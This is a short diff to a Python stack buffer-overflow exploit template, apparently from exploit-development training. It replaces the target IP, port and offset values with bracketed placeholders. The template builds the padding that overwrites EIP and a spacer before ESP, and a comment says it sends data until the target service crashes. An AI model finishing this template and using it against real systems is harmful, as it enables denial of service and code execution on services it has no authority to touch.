@@ -4,13 +4,13 @@
 import socket, sys
 
 # CHANGE THESE!!!
-target_IP = 1.1.1.1
-target_port = XXXX
+target_IP = [IP]
+target_port = [port]
 ## Enter in the msf-pattern_offset amount.
 pattern_offset_value = "A" * [input length outputed by msf-pattern_offset]
 EIP = "B" * 4
 ## Enter the amount of byte space that seperates EIP and ESP from crash using previous script.
-EIP_to_ESP = "C" * XXXX
+EIP_to_ESP = "C" * [byte space between EIP and ESP]
 new_buffer = "D" * 500
 
 # Try statement that will send data until it receives an exception from the target host where it is no longer reachable because we crashed it.
